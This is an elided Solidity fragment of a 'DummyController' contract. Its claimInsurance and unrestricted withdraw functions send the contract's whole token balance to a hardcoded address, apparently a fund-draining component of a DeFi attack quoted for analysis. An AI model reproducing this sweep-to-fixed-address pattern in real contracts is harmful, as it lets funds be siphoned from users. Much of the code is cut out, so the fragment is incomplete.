...
contract DummyController {
    ...
    address constant controller = 0x2D407dDb06311396fE14D4b49da5F0471447d45C;
    ...
    function claimInsurance(address _vault) external {
        ...
        _safeTransfer(token, controller, erc20(token).balanceOf(address(this)));
    }
    function withdraw(address _token) external {
        _safeTransfer(_token, controller, erc20(_token).balanceOf(address(this)));
    }
